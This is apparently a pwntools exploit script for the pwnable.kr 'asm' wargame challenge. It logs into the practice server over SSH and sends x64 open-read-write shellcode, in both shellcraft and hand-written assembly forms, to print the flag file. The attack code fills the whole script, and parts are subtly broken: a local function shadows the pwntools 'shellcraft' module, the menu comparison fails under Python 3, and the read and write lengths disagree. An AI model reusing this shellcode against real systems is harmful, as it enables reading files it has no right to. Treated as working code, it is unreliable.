from pwn import *

context.update(arch="amd64",os="linux",bit=64)

rssh = ssh(host="pwnable.kr",port=2222,user="asm",password="guest")
p = rssh.connect_remote("localhost",9026)

def pwn(shellcode):
    p.recvuntil("give me your x64 shellcode:")
    p.send(shellcode)
    p.interactive()
    p.close()
    

def shellcraft():
    shellcode = shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
    shellcode += shellcraft.open('rsp', 0, 0)
    shellcode += shellcraft.read('rax', 'rsp', 100)
    shellcode += shellcraft.write(1, 'rsp', 100)
    shellcode += shellcraft.exit()
    pwn(shellcode)

def hcAssembly():
    shellcode = asm("""
            xor rax,rax
            xor rdi,rdi
            xor rsi,rsi
            xor rdx,rdx
            jmp init

        open:
	        pop rdi
	        mov rax,2
	        syscall

        read:
	        mov rdi,rax
	        mov rsi,rsp
	        mov rdx,0x40
	        xor rax,rax
	        syscall

        write:
	        mov rdi,1
	        mov rdx,40
	        mov rax,1
	        syscall

        exit:
	        mov rax,0x3c
	        syscall

        init:
	        call open
	        .ascii "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
	        .byte 0                 
    """)
    pwn(shellcode)


     
while(1):
    print("There are two ways to exploit this either by hardcoded assembly (1) \n or by using pwnlib's shellcrafting")  
    selection = input()
    if (selection == 1):
        hcAssembly()
        exit(0)
    elif (selection == 2):
        shellcraft()
        
